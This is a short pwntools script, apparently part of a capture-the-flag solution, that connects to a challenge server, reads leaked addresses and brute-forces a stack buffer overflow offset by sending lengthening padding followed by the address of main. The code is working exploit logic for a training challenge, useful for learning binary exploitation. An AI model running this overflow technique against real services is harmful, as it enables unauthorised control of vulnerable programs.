from pwn import * 

i = 39
while True:
    io = remote("spaceheroes-blast-off.chals.io", 443, ssl=True, sni="spaceheroes-blast-off.chals.io")

    io.recvuntil("PUTS_PLT ")
    putsPlt = int(io.recv(8),16)
    io.recvuntil("BROP_GADGET ")
    bropGadget = int(io.recv(8),16)
    io.recvuntil("BLAST_OFF GOT ")
    blastOffGot = int(io.recv(8),16)
    io.recvuntil("MAIN ")
    main = int(io.recv(8),16)

    exploit = b"A" * i + p64(main)
    i += 1

    io.sendlineafter("Please enter the launch codes to start: ",exploit)

    try:
        io.recvuntil(b"Please enter the launch codes to start:")
        print(i)
        break
    except:
        pass
